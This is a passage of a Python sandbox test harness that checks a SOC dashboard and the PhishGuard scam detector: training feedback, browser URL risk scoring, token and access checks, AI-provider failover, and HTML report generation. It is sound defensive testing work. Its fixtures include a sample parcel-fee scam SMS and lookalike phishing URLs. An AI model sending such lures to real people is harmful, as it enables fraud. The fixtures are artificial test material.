            need = 55 if case["label"] == "scam" and case.get("mode") != "link" else 30
            ok = r["score"] >= need if positive else r["score"] < 30
            if case.get("expect_category"):
                ok = ok and r["category"] == case["expect_category"]
            flagged = r["score"] >= 30
            stats["tp" if positive and flagged else "fn" if positive else "fp" if flagged else "tn"] += 1
            exp = {"scam": "Likely scam (≥ 55)", "spam": "flagged (≥ 30)", "safe": "not flagged (< 30)"}[case["label"]]
            if case.get("mode") == "link" and case["label"] == "scam":
                exp = "\"Don't open\" warning (≥ 30)"
            self.record(suite, case["name"], ok, exp, f"{r['verdict']} ({r['score']}/100) · {r['category'] or 'no category'}", {
                "sender": case.get("sender", ""), "subject": case.get("subject", ""), "message": case.get("body", ""),
                "signals": [f"{f['points']:+d}  {f['text']}  [{f['module']}]" for f in r["flags"]],
                "ai": [f"{o['provider']}: {o.get('score', o.get('error'))}" for o in r.get("ai", [])]})
        self.metrics[suite + "_msgs" if suite == "custom" else suite] = stats
        self.set_ai(True, True)

    def suite_training(self):
        self.reset()
        self.set_ai(not self.live_ai or bool(self.ai_keys["claude"]), False)
        S = "training"
        self.client.post("/api/dev/login", json={})  # the training view is developer-only (no-op on builds without it)
        novel = {"mode": "sms", "sender": "+1 (302) 555-0199",
                 "body": "Your parcel is on hold. Pay the $1.99 redelivery fee at https://parcel-redeliver-hold.com/pay or call 302-555-0177"}
        r1 = self.scan(novel)
        self.record(S, "1 · Scan an unseen scam", True, "baseline score", f"{r1['verdict']} ({r1['score']}/100)",
                    {"signals": [f"{f['points']:+d}  {f['text']}" for f in r1["flags"]]})
        fb = self.feedback(r1["id"], "scam").get_json()
        learned = {(x["kind"], x["value"]) for x in fb.get("learned", [])}
        want = {("senders", "3025550199"), ("domains", "parcel-redeliver-hold.com"), ("phones", "3025550177")}
        self.record(S, "2 · Confirm it → indicators learned", want <= learned, "sender, domain, callback number",
                    ", ".join(f"{k[:-1]} {v}" for k, v in sorted(learned)) or "nothing")
        r2 = self.scan({"mode": "sms", "sender": "(302) 555-0199", "body": "Reminder about your delivery."})
        hit = any(f["module"] == "Your training" for f in r2["flags"])
        self.record(S, "3 · Same sender, harmless-looking text", hit and r2["score"] >= 30, "flagged by your training",
                    f"{r2['verdict']} ({r2['score']}/100)", {"signals": [f"{f['points']:+d}  {f['text']}" for f in r2["flags"]]})
        r3 = self.scan({"mode": "sms", "sender": "(410) 555-0123", "body": "Track it here: parcel-redeliver-hold.com/t/88"})
        self.record(S, "4 · New sender, learned domain", any("previously confirmed" in f["text"] for f in r3["flags"]),
                    "domain recognised", f"{r3['verdict']} ({r3['score']}/100)")
        if r3.get("ai") and not self.live_ai:
            reached = any("matches an example you confirmed" in (o.get("reasoning") or "") for o in r3["ai"])
            self.record(S, "5 · Confirmed example reaches the AI as context", reached, "AI cites your example",
                        "; ".join(o.get("reasoning", o.get("error", "")) for o in r3["ai"]))
        if self.has_soc:
            _, ev = self.request({"path": "/log?u=https%3A%2F%2Fparcel-redeliver-hold.com%2Fpay", "ip": "192.0.2.201"})
            self.record(S, "6 · Learned domain flagged in web traffic", "KNOWN_SCAM_IOC" in ev["threat_tags"],
                        "Known scam IOC on Network tab", f"{ev['severity']}; tags {', '.join(ev['threat_tags']) or 'none'}")
        else:
            feed = self.client.get("/api/iocs").get_json()
            self.record(S, "6 · Learned domain published for the SOC dashboard", "parcel-redeliver-hold.com" in feed["domains"],
                        "listed in /api/iocs", f"{len(feed['domains'])} domains in feed")
        fresh = self.mod.TrainingStore(self.data_path)
        self.record(S, "7 · Training survives a restart", "parcel-redeliver-hold.com" in fresh.data["iocs"]["domains"],
                    "domain still stored after reload", "stored" if "parcel-redeliver-hold.com" in fresh.data["iocs"]["domains"] else "lost")
        self.feedback(r1["id"], "safe")
        tr = self.client.get("/api/phishguard/training").get_json()
        gone = not any(i["value"] == "parcel-redeliver-hold.com" for i in tr["iocs"])
        self.record(S, "8 · Change verdict to safe → retracted", gone and any(i["value"] == "3025550199" for i in tr["allow"]),
                    "indicators removed, sender trusted", f"{len(tr['iocs'])} indicators left, {len(tr['allow'])} trusted senders")
        if self.has_soc:
            _, ev = self.request({"path": "/log?u=parcel-redeliver-hold.com", "ip": "192.0.2.201"})
            self.record(S, "9 · Retracted domain no longer flagged on network", "KNOWN_SCAM_IOC" not in ev["threat_tags"],
                        "no IOC tag", ", ".join(ev["threat_tags"]) or "no tags")
        else:
            feed = self.client.get("/api/iocs").get_json()
            self.record(S, "9 · Retracted domain removed from the SOC feed", "parcel-redeliver-hold.com" not in feed["domains"],
                        "not in /api/iocs", f"{len(feed['domains'])} domains in feed")
        r4 = self.scan({"mode": "sms", "sender": "(302) 555-0199", "body": "Reminder about your delivery."})
        self.record(S, "10 · Trusted sender gets −30", any(f["points"] == -30 for f in r4["flags"]), "−30 applied",
                    f"{r4['verdict']} ({r4['score']}/100)")
        self.set_ai(True, True)

    def suite_browser(self):
        self.reset()
        m, c, S = self.mod, self.client, "browser"
        tp = fp = tn = fn = 0
        for name, url, rtype, label in BROWSER_CASES:
            a = m.analyze_browser_url(url, rtype)
            flagged = a["risk"] >= 30
            ok = {"benign": a["risk"] < 30, "notice": 30 <= a["risk"] < 55, "malicious": flagged}[label]
            if label == "malicious":
                tp += flagged; fn += not flagged
            elif label == "benign":
                fp += flagged; tn += not flagged
            exp = {"benign": "not flagged (< 30)", "notice": "worth a look (30–54)", "malicious": "flagged (≥ 30)"}[label]
            self.record(S, name, ok, exp, f"{a['severity']} ({a['risk']}/100)", {"url": url, "type": rtype, "why": a["reasons"]})
        self.metrics["browser"] = {"tp": tp, "fp": fp, "tn": tn, "fn": fn}
        H = {"X-SOC-Browser-Token": m.BROWSER_TOKEN}
        ev = lambda url, t="main_frame": {"url": url, "type": t, "t": time.time() * 1000}
        r = c.post("/api/browser/events", json={"events": [ev("https://example.com/")]})
        self.record(S, "Extension without token is rejected", r.status_code == 401, "401", str(r.status_code))
        r = c.post("/api/browser/events", headers={"X-SOC-Browser-Token": "nope"}, json={"events": [ev("https://example.com/")]})
        self.record(S, "Extension with wrong token is rejected", r.status_code == 401, "401", str(r.status_code))
        r = c.post("/api/browser/events", headers=H, json={"events": [ev("https://example.com/")] * 1001})
        self.record(S, "Oversized batch rejected", r.status_code == 400, "400", str(r.status_code))
        batch = [ev("https://news.example.org/story?id=42&utm_source=mail"), ev("https://cdn.example.org/a.js", "script"),
                 ev("http://paypa1-secure-login.top/account-suspended/verify-account?session=abc"),
                 ev("http://localhost/api/stats", "xmlhttprequest"), ev("chrome-extension://abc/popup.html"),
                 {"url": "https://ads.tracker.example/px", "type": "image", "error": "net::ERR_BLOCKED_BY_CLIENT"}]
        r = c.post("/api/browser/events", headers=H, json={"client": {"id": "t1", "name": "Test Chrome"}, "events": batch})
        j = r.get_json() or {}
        self.record(S, "Batch accepted; dashboard's own and non-web URLs skipped", r.status_code == 200 and j.get("accepted") == 4 and j.get("skipped") == 2,
                    "4 accepted, 2 skipped", str(j))
        rows = c.get("/api/browser/events").get_json()
        story = next((x for x in rows if x["host"] == "news.example.org"), {})
        phish = next((x for x in rows if x["host"] == "paypa1-secure-login.top"), {})
        self.record(S, "Privacy: normal requests stored without query strings", story.get("url") == "https://news.example.org/story",
                    "https://news.example.org/story", story.get("url", "missing"))
        self.record(S, "Flagged requests keep the full URL for review", "session=abc" in phish.get("url", ""),
                    "full URL", phish.get("url", "missing"))
        sm = c.get("/api/browser/summary").get_json()
        self.record(S, "Daily summary counts requests, pages, new sites, blocks",
                    sm["requests"] == 4 and sm["pages"] == 2 and sm["new_sites"] == 3 and sm["blocked"] == 1 and sm["flagged"] >= 1,
                    "4 requests · 2 pages · 3 new sites (news + cdn are one site) · 1 blocked", f"{sm['requests']} · {sm['pages']} · {sm['new_sites']} · {sm['blocked']}")
        al = [a for a in getattr(m, "alerts", []) if a["category"] == "BROWSER"]
        self.record(S, "High-risk browsing raises a dashboard alert", len(al) >= 1, "≥ 1 alert", f"{len(al)} alert(s)")
        PUB = {"REMOTE_ADDR": "8.8.8.8"}
        r = c.get("/api/browser/summary", environ_base=PUB)
        self.record(S, "Outsiders can't read your browsing summary", r.status_code in (401, 403), "403", str(r.status_code))
        r = c.post("/api/browser/block", json={"site": "evil.example"}, environ_base=PUB)
        self.record(S, "Outsiders can't change your browser blocklist", r.status_code in (401, 403), "403", str(r.status_code))
        r = c.post("/api/browser/block", json={"site": "https://www.evil-download.top/path"})
        self.record(S, "Block from dashboard (URL normalised to site)", r.status_code == 200 and r.get_json()["site"] == "evil-download.top",
                    "evil-download.top", str(r.get_json()))
        r = c.post("/api/browser/block", json={"site": "not a site"})
        self.record(S, "Invalid site rejected", r.status_code == 400, "400", str(r.status_code))
        r = c.get("/api/browser/blocklist", headers=H, environ_base=PUB)
        bl = r.get_json() if r.status_code == 200 else []
        self.record(S, "Extension (with token) can fetch the blocklist", r.status_code == 200 and bool(bl) and bl[0]["site"] == "evil-download.top",
                    "1 site", str(r.get_json())[:80])
        with m._bdb_lock:
            m._bdb.execute("INSERT INTO browser_events (ts, day, hour, site, host, url, risk, severity, tags, hits, reasons, blocked) "
                           "VALUES (?, '2020-01-01', 0, 'old.example', 'old.example', 'https://old.example/', 0, 'info', '[]', '[]', '[]', 0)",
                           (time.time() - (m.BROWSER_RETENTION_DAYS + 1) * 86400,))
            m._bdb.commit()
        n = m.purge_browser_history()
        self.record(S, f"History older than {m.BROWSER_RETENTION_DAYS} days is deleted", n == 1, "1 old row removed", f"{n} removed")

    def suite_ai(self):
        if self.live_ai:
            self.reset()
            for prov in ("claude", "gemini"):
                if not self.ai_keys[prov]:
                    continue
                self.set_ai(prov == "claude", prov == "gemini")
                r = self.scan(self.mod.PG_EXAMPLES[1])
                o = (r.get("ai") or [{}])[0]
                self.record("ai", f"Live {prov.title()} call", "score" in o, "valid opinion", str(o.get("score", o.get("error"))),
                            {"reasoning": o.get("reasoning", ""), "model": o.get("model", "")})
            self.set_ai(True, True)
            return
        S = "ai"
        msg = {"mode": "sms", "sender": "(555) 010-2000", "body": "Pay your toll balance today: https://ez-toll-pay.xyz"}
        combos = [("No keys configured", False, False), ("Claude only", True, False), ("Gemini only", False, True), ("Claude + Gemini", True, True)]
        for label, cl, ge in combos:
            self.reset(); self.set_ai(cl, ge)
            r = self.scan(msg)
            provs = sorted(o["provider"] for o in r["ai"])
            want = sorted(p for p, on in (("Claude", cl), ("Gemini", ge)) if on)
            avg = round(sum(o["score"] for o in r["ai"]) / len(r["ai"])) if r["ai"] else None
            blended = r["score"] == (r["heuristic_score"] if avg is None else round((r["heuristic_score"] + avg) / 2))
            self.record(S, label, provs == want and blended, f"opinions from {', '.join(want) or 'none'}; score blended",
                        f"rules {r['heuristic_score']} + AI {avg} → {r['score']}",
                        {"opinions": [f"{o['provider']} ({o['model']}): {o.get('score')} — {o.get('reasoning', '')}" for o in r["ai"]]})
        self.reset(); self.set_ai(False, True)
        self.scan(msg)
        call = next(c for c in self.net.calls[::-1] if "generativelanguage" in c["url"])
        ok = SIM_KEY not in call["url"] and call["headers"].get("x-goog-api-key") == SIM_KEY
        self.record(S, "Gemini key sent in header, never in URL", ok, "header only", "header only" if ok else "KEY IN URL")
        faults = [("Gemini safety block", "Gemini", "safety", "safety"), ("Gemini model not found", "Gemini", "404", "not found"),
                  ("Gemini empty reply", "Gemini", "empty", "MAX_TOKENS"), ("Claude bad API key", "Claude", "auth", "invalid"),
                  ("Claude reply without JSON", "Claude", "garbage", "no JSON"), ("Claude rate limited", "Claude", "rate", "Rate limit")]
        for label, prov, fault, needle in faults:
            self.reset(); self.set_ai(True, True); self.net.faults[prov] = fault
            r = self.scan(msg)
            bad = next(o for o in r["ai"] if o["provider"] == prov)
            other = next(o for o in r["ai"] if o["provider"] != prov)
            ok = needle.lower() in bad.get("error", "").lower() and r["ai_score"] == other.get("score")
            self.record(S, f"{label} → other provider still used", ok, f"error shown; score from {other['provider']}",
                        f"{prov}: {bad.get('error', bad.get('score'))}")
        self.reset(); self.set_ai(True, True); self.net.faults.update({"Claude": "timeout", "Gemini": "timeout"})
        r = self.scan(msg)
        self.record(S, "Both providers time out → rules engine only", r["score"] == r["heuristic_score"] and r["ai_score"] is None,
                    "score = rules score", f"rules {r['heuristic_score']} → {r['score']}")
        self.reset(); self.set_ai(True, True); self.net.latency = 0.4
        t0 = time.perf_counter(); self.scan(msg); dt = time.perf_counter() - t0
        self.record(S, "Providers queried in parallel", dt < 0.7, "≈ 0.4 s (not 0.8 s)", f"{dt:.2f} s")
        self.set_ai(True, True)

    def run(self, suites, extra):
        order = ["network", "security", "browser", "messages", "training", "ai", "custom"]
        for name in order:
            if name not in suites:
                continue
            if name in ("messages", "training", "ai") and not self.has_pg:
                continue
            if name == "network" and not self.has_soc:
                continue
            if name == "browser" and not self.has_browser:
                continue
            t0 = time.perf_counter()
            if name == "custom":
                if extra.get("network") and self.has_soc:
                    self.suite_network(extra["network"], only_extra=True, suite="custom")
                if extra.get("messages") and self.has_pg:
                    self.suite_messages(extra["messages"], only_extra=True, suite="custom")
            else:
                getattr(self, f"suite_{name}")()
            rows = [r for r in self.results if r["suite"] == name]
            skipped = sum(r["passed"] is None for r in rows)
            print(f"  {name:9} {sum(r['passed'] is True for r in rows):3}/{len(rows) - skipped:<3} passed"
                  f"{f', {skipped} skipped' if skipped else ''}  ({time.perf_counter() - t0:.1f}s)")

    def cleanup(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


# ══════════════════════════════════════════════════════════════════════════════
# REPORT
# ══════════════════════════════════════════════════════════════════════════════
SUITE_INFO = {
    "network": ("Network detection", "Labelled web requests. Attacks should reach medium severity or higher; normal traffic should stay low."),
    "security": ("Security controls", "Access control, rate limiting, input limits, output escaping, and the sandbox's own network block."),
    "messages": ("Message detection", "Labelled SMS and email. Scams should score 55 or more, unwanted spam 30 or more, and genuine messages under 30."),
    "training": ("Training loop", "One message followed through confirm, reuse, restart, and retraction, in order."),
    "browser": ("Browser monitoring", "Labelled URLs your browser might request (legitimate ones include security news, sign-in pages and an installer download), plus the extension's ingest, privacy and blocklist endpoints."),
    "ai": ("AI providers", "Claude and Gemini configurations and failure modes, using simulated models that speak each real API format."),
    "custom": ("Your scenarios", "Cases loaded from your scenarios file."),
}


APP_NAMES = {"soc_dashboard.py": "SOC dashboard", "phishguard.py": "PhishGuard", "phishguard_soc.py": "PhishGuard SOC",
             "soc_dashboard_v3.py": "SOC dashboard v3"}
METRIC_TITLES = {"network": "Server traffic: requests", "browser": "Browser: URLs", "messages": "Messages: rules engine"}


def _suite_title(key: str) -> str:
    target, _, suite = key.rpartition(":")
    return (APP_NAMES.get(target, target) + " · " if target else "") + SUITE_INFO[suite][0]


def _cls(r):
    return "skip" if r["passed"] is None else "ok" if r["passed"] else "bad"


def _metric_block(title, m):
    if not m:
        return ""
    pos, neg = m["tp"] + m["fn"], m["tn"] + m["fp"]
    det = f"{m['tp']} of {pos}" if pos else "—"
    fa = f"{m['fp']} of {neg}" if neg else "—"
    prec = f"{100 * m['tp'] / (m['tp'] + m['fp']):.0f}%" if m["tp"] + m["fp"] else "—"
    return f"""<div class="metric"><h3>{html.escape(title)}</h3>
      <dl><dt>Threats caught</dt><dd>{det}</dd><dt>False alarms</dt><dd>{fa}</dd><dt>Precision</dt><dd>{prec}</dd></dl></div>"""


def write_report(bench: Bench, path_html: str, path_json: str, duration: float):
    res = bench.results
    passed = sum(r["passed"] is True for r in res)
    skipped = sum(r["passed"] is None for r in res)
    when = datetime.now().strftime("%B %-d, %Y at %H:%M") if os.name != "nt" else datetime.now().strftime("%B %d, %Y at %H:%M")
    ai_mode = "your real Claude/Gemini keys" if bench.live_ai else "simulated Claude and Gemini models"
    suites = list(dict.fromkeys(r["suite"] for r in res))
    rack = "".join(
        f'<div class="rack-row"><span class="rack-l">{html.escape(_suite_title(s))}</span><span class="rack-c">'
        + "".join(f'<a href="#c{i}" class="cell {_cls(r)}" title="{html.escape(r["name"])}"></a>'
                  for i, r in enumerate(res) if r["suite"] == s)
        + "</span></div>" for s in suites)
    sections = []
    for s in suites:
        rows = []
        for i, r in enumerate(res):
            if r["suite"] != s:
                continue
            det = ""
            if r["detail"]:
                items = []
                for k, v in r["detail"].items():
                    if v in ("", [], None):
                        continue
                    val = "<br>".join(html.escape(str(x)) for x in v) if isinstance(v, list) else html.escape(str(v))
                    items.append(f"<dt>{html.escape(k.replace('_', ' ').capitalize())}</dt><dd>{val}</dd>")
                det = f'<details><summary>Details</summary><dl class="kv">{"".join(items)}</dl></details>' if items else ""
            rows.append(f"""<tr id="c{i}" class="{_cls(r)}">
              <td class="st">{ {'ok': 'Pass', 'bad': 'Fail', 'skip': 'Skipped'}[_cls(r)] }</td>
              <td><div class="nm">{html.escape(r['name'])}</div>{det}</td>
              <td>{html.escape(str(r['expected']))}</td><td>{html.escape(str(r['actual']))}</td></tr>""")
        n_ok = sum(r["passed"] is True for r in res if r["suite"] == s)
        n = sum(r["suite"] == s and r["passed"] is not None for r in res)
        sections.append(f"""<section><h2>{html.escape(_suite_title(s))} <span class="cnt">{n_ok} of {n} passed</span></h2>
          <p class="lede">{html.escape(SUITE_INFO[s.rpartition(":")[2]][1])}</p>
          <div class="tw"><table><thead><tr><th>Result</th><th>Check</th><th>Expected</th><th>Got</th></tr></thead>
          <tbody>{''.join(rows)}</tbody></table></div></section>""")
    failures = [r for r in res if r["passed"] is False]
    headline = ("" if not failures else
                f"{len(failures)} check{'s' if len(failures) != 1 else ''} failed — listed in red below.")
    page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><title>Sandbox run · {html.escape(bench.target)}</title>
<style>
:root{{--paper:#f6f7f9;--card:#fff;--ink:#15233f;--sub:#56627a;--rule:#d8dde6;--ok:#17784a;--bad:#bf3a30;--warn:#a86a12;
  --th:#fafbfc;--bad-row:#fdf3f2;--skip:#b9c0cc;--target:rgba(21,35,63,.05);color-scheme:light}}
@media (prefers-color-scheme:dark){{:root:not([data-theme="light"]){{--paper:#10151f;--card:#161d2b;--ink:#e6ebf3;--sub:#9aa6ba;--rule:#2a3346;
  --ok:#3ecf8e;--bad:#ff7a6e;--warn:#e0a43a;--th:#1b2334;--bad-row:rgba(255,122,110,.08);--skip:#4b5568;--target:rgba(230,235,243,.06);color-scheme:dark}}}}
:root[data-theme="dark"]{{--paper:#10151f;--card:#161d2b;--ink:#e6ebf3;--sub:#9aa6ba;--rule:#2a3346;
  --ok:#3ecf8e;--bad:#ff7a6e;--warn:#e0a43a;--th:#1b2334;--bad-row:rgba(255,122,110,.08);--skip:#4b5568;--target:rgba(230,235,243,.06);color-scheme:dark}}
:root{{padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}}
*{{box-sizing:border-box;margin:0;padding:0}}
html{{scroll-padding-top:env(safe-area-inset-top,0px);background:var(--paper)}}
body{{background:var(--paper);color:var(--ink);font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;padding:40px 20px 80px}}
main{{max-width:1080px;margin:0 auto}}
header p{{color:var(--sub);max-width:72ch}}
h1{{font-size:30px;line-height:1.2;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}}
.result{{font-size:20px;font-weight:600;margin:22px 0 4px}}
.result.bad{{color:var(--bad)}} .result.ok{{color:var(--ok)}}
.rack{{background:var(--card);border:1px solid var(--rule);border-radius:6px;padding:16px 18px;margin:18px 0 28px}}
.rack-row{{display:flex;align-items:center;gap:14px;padding:5px 0}}
.rack-l{{width:230px;flex-shrink:0;font-size:13px;color:var(--sub)}}
.rack-c{{display:flex;flex-wrap:wrap;gap:4px}}
.cell{{width:16px;height:16px;border-radius:3px;display:block}}
.cell.ok{{background:var(--ok)}} .cell.skip{{background:var(--skip)}} .cell.bad{{background:var(--bad);outline:2px solid var(--bad-row);outline-offset:1px}}
.cell:focus-visible{{outline:2px solid var(--ink);outline-offset:2px}}
.metrics{{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px;margin-bottom:34px}}
.metric{{background:var(--card);border:1px solid var(--rule);border-radius:6px;padding:14px 18px}}
.metric h3{{font-size:14px;margin-bottom:8px}}
.metric dl{{display:grid;grid-template-columns:1fr auto;gap:4px 12px;font-size:14px}}
.metric dt{{color:var(--sub)}} .metric dd{{font-weight:600;text-align:right}}
section{{margin-bottom:38px}}
h2{{font-size:20px;margin-bottom:2px;display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}}
h2 .cnt{{font-size:13px;font-weight:500;color:var(--sub)}}
.lede{{color:var(--sub);font-size:14px;margin-bottom:10px;max-width:75ch}}
.tw{{overflow-x:auto;background:var(--card);border:1px solid var(--rule);border-radius:6px}}
table{{width:100%;border-collapse:collapse;font-size:14px}}
th{{text-align:left;font-weight:600;font-size:13px;color:var(--sub);padding:9px 12px;border-bottom:1px solid var(--rule);background:var(--th)}}
td{{padding:9px 12px;border-bottom:1px solid var(--rule);vertical-align:top}}
tr:last-child td{{border-bottom:0}}
tr.bad td{{background:var(--bad-row)}}
tr:target td{{box-shadow:inset 0 0 0 9999px var(--target)}}
.st{{font-weight:700;width:68px}} tr.ok .st{{color:var(--ok)}} tr.bad .st{{color:var(--bad)}} tr.skip .st{{color:var(--sub)}}
.nm{{font-weight:500}}
details{{margin-top:4px}} summary{{cursor:pointer;color:var(--sub);font-size:13px}}
.kv{{display:grid;grid-template-columns:110px 1fr;gap:4px 12px;margin-top:6px;font-size:13px}}
.kv dt{{color:var(--sub)}} .kv dd{{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12.5px;word-break:break-word}}
footer{{color:var(--sub);font-size:13px;border-top:1px solid var(--rule);padding-top:14px;max-width:75ch}}
@media (max-width:640px){{.rack-row{{flex-direction:column;align-items:flex-start;gap:6px}} .kv{{grid-template-columns:1fr}}}}
@media print{{body{{padding:0}} details{{display:none}}}}
</style></head><body><main>
<header><h1>Sandbox run of {html.escape(bench.target)}</h1>
<p>Run on {html.escape(when)} in {duration:.1f} seconds. The app ran offline with outbound internet blocked, a fake geo-IP service,
{html.escape(ai_mode)}, and a throw-away training store.</p></header>
<p class="result {'ok' if not failures else 'bad'}">{passed} of {len(res) - skipped} checks passed{f" ({skipped} skipped)" if skipped else ""}. {html.escape(headline)}</p>
<div class="rack" aria-label="Every check, grouped by suite">{rack}</div>
<div class="metrics">{''.join(_metric_block(METRIC_TITLES.get(k.rpartition("|")[2], k) + (' + live AI' if bench.live_ai and k.endswith('messages') else ''), v) for k, v in bench.metrics.items() if k.rpartition("|")[2] in METRIC_TITLES)}</div>
{''.join(sections)}
<footer>Blocked outbound attempts during the run: {len(bench.guard.blocked)}. Simulated AI models are deterministic stand-ins that exercise the
app's real request and response handling; they say nothing about how accurate Claude or Gemini are. Run with --live-ai to test the real models.</footer>
</main></body></html>"""
    with open(path_html, "w", encoding="utf-8") as f:
        f.write(page)
    with open(path_json, "w", encoding="utf-8") as f:
        json.dump({"target": bench.target, "passed": passed, "total": len(res), "metrics": bench.metrics,
                   "results": res, "blocked_outbound": bench.guard.blocked}, f, indent=1)


# ══════════════════════════════════════════════════════════════════════════════
# SERVE MODE
# ══════════════════════════════════════════════════════════════════════════════
def serve(bench: Bench, port: int):
    m = bench.mod
    if hasattr(m, "start_demo"):
        m.start_demo()
    if bench.has_pg:
        for e in m.PG_EXAMPLES:
            m.phishguard_scan(e["mode"], e["sender"], e["subject"], e["body"])
    print(f"\nSandbox server: http://127.0.0.1:{port}  (offline · simulated geo + AI · temp training store)")
    print("Demo traffic is streaming in and the built-in examples are pre-scanned. Ctrl+C to stop.\n")
    try:
        m.app.run(host="127.0.0.1", port=port, threaded=True, use_reloader=False)
    finally:
        bench.cleanup()


class Combined:
    """Merges several benches into one report."""
    def __init__(self, benches):
        multi = len(benches) > 1
        self.results = [{**r, "suite": f"{b.target}:{r['suite']}" if multi else r["suite"]} for b in benches for r in b.results]
        self.metrics = {(f"{b.target}|" if multi else "") + k: v for b in benches for k, v in b.metrics.items()}
        self.target = " and ".join(b.target for b in benches)
        self.live_ai = benches[0].live_ai
        self.guard = type("G", (), {"blocked": [x for b in benches for x in b.guard.blocked]})()


def main():
    ap = argparse.ArgumentParser(description="Run the apps in an isolated sandbox and check the results.")
    ap.add_argument("--target", action="append", help="app file to test (repeatable). Default: soc_dashboard.py and phishguard.py")
    ap.add_argument("--suite", action="append", choices=["network", "security", "browser", "messages", "training", "ai", "custom"])
    ap.add_argument("--scenarios", help="JSON file with extra labelled cases")
    ap.add_argument("--live-ai", action="store_true", help="use real ANTHROPIC_API_KEY / GEMINI_API_KEY")
    ap.add_argument("--serve", action="store_true", help="launch the (first) app inside the sandbox for manual testing")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--out", default=HERE, help="folder for sandbox_report.html and sandbox_results.json")
    args = ap.parse_args()
    targets = args.target or [p for p in (os.path.join(HERE, "soc_dashboard.py"), os.path.join(HERE, "phishguard.py")) if os.path.exists(p)]
    if not targets:
        sys.exit("No app found. Put sandbox.py next to soc_dashboard.py / phishguard.py, or pass --target.")
    for t in targets:
        if not os.path.exists(t):
            sys.exit(f"Target not found: {t}")
    if args.live_ai and not (os.environ.get("ANTHROPIC_API_KEY") or os.environ.get("GEMINI_API_KEY") or os.environ.get("GOOGLE_API_KEY")):
        sys.exit("--live-ai needs ANTHROPIC_API_KEY and/or GEMINI_API_KEY in the environment")
    extra = {}
    if args.scenarios:
        with open(args.scenarios, encoding="utf-8") as f:
            extra = json.load(f)
    if args.serve:
        print(f"Sandbox · serving {os.path.basename(targets[0])} · AI {'live' if args.live_ai else 'simulated'} · outbound internet blocked")
        return serve(Bench(targets[0], args.live_ai), args.port)

    suites = args.suite or ["network", "security", "browser", "messages", "training", "ai"] + (["custom"] if extra else [])
    benches, t0 = [], time.perf_counter()
    for t in targets:
        print(f"Sandbox · {os.path.basename(t)} · AI {'live' if args.live_ai else 'simulated'} · outbound internet blocked")
        bench = Bench(t, args.live_ai)
        try:
            bench.run(suites, extra)
        finally:
            bench.cleanup()
        benches.append(bench)
    dur = time.perf_counter() - t0
    combined = Combined(benches)
    os.makedirs(args.out, exist_ok=True)
    out_html, out_json = os.path.join(args.out, "sandbox_report.html"), os.path.join(args.out, "sandbox_results.json")
    write_report(combined, out_html, out_json, dur)
    fails = [r for r in combined.results if r["passed"] is False]
    ran = [r for r in combined.results if r["passed"] is not None]
    print(f"\n{len(ran) - len(fails)}/{len(ran)} checks passed in {dur:.1f}s"
          + (f" ({len(combined.results) - len(ran)} skipped)" if len(ran) < len(combined.results) else ""))
    for r in fails:
        print(f"  FAIL [{r['suite']}] {r['name']}: expected {r['expected']} — got {r['actual']}")
    print(f"Report: {out_html}\nData:   {out_json}")
    sys.exit(1 if fails else 0)


if __name__ == "__main__":
    main()
